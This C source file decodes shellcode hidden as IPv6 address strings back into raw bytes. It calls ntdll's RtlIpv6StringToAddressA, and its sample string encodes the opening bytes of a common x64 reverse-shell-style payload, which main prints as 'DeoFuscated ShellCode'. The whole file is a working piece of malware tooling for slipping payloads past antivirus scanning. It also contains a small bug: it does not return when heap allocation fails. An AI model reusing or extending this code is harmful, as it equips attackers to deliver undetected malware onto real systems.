#include <Windows.h> 
#include <stdio.h> 

typedef NTSTATUS (NTAPI * fnRtlIPv6StringtoAddressA)
(
    PCSTR S, 
    PCSTR *Terminator,
    PVOID Addr 
);

BOOL Ipv6Deofuscation(IN CHAR *Ipv6Array[], IN SIZE_T NmbrOfElements, OUT
PBYTE *ppDAddress, OUT SIZE_T *pDSize)
{
    PBYTE pBuffer = NULL , TmpBuffer = NULL; 

    SIZE_T sBuffSize = 0; 
    PCSTR Terminator = NULL;
    NTSTATUS STATUS = 0; 

    fnRtlIPv6StringtoAddressA pRtIpv6StringToAddressA = 
    (fnRtlIPv6StringtoAddressA) GetProcAddress(GetModuleHandle(TEXT("ntdll")), "RtlIpv6StringToAddressA");
    if (pRtIpv6StringToAddressA == NULL)
    {
        printf("Get ProcAddress Failed with Error : %d\n", 
        GetLastError()); 
        return FALSE; 
    }

    sBuffSize = NmbrOfElements *16 ; 

    pBuffer = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
    
    if (pBuffer == NULL)
    {
        printf("Heap Alloc Failed with Error : %d\n", GetLastError()); 
    }
    TmpBuffer = pBuffer; 

    for (SIZE_T i = 0 ; i < NmbrOfElements ; i++)
    {
        STATUS = pRtIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer); 
        if (STATUS != 0x0)
        {
            printf("[!] RtlIpv6StringToAddress Failed at [ %s] with Error 0x%0.8X\n", Ipv6Array[i] , STATUS); 
            HeapFree(GetProcessHeap(), 0 , pBuffer); 
            return FALSE; 
        }

        TmpBuffer += 16; 
    }

    *ppDAddress = pBuffer; 
    *pDSize = sBuffSize; 

    return TRUE; 

}

int main ()
{
    // Example IPV6 array .. // 
    CHAR *Ipv6Array[] = 
    {
        "FC48:83E4:F0E8:C000:0000:4151:4150:5251"
    }; 

    SIZE_T NmbrOfElements = sizeof(Ipv6Array) / sizeof(Ipv6Array[0]);

    PBYTE pDAdress = NULL; 
    SIZE_T pDSize = 0; 

    if (Ipv6Deofuscation(Ipv6Array, NmbrOfElements, &pDAdress, &pDSize ))
    {
        printf("DeobFuscation successful!, SIZE : %llu bytes\n", pDSize); 

        // print the deofuscated shellcode .. // 
        printf("DeoFuscated ShellCode :\n"); 
        for (SIZE_T i = 0 ; i < pDSize ; i++)
        {
            if (i % 16 == 0 && i != 0) 
            {
            printf("\n");

            }

            printf("0x%02X," , pDAdress[i]); 
        }

        printf("\n"); 

        HeapFree(GetProcessHeap(),0, pDAdress); 
    }
    else 
    {
        printf("Failed"); 
    }
    return  0; 
}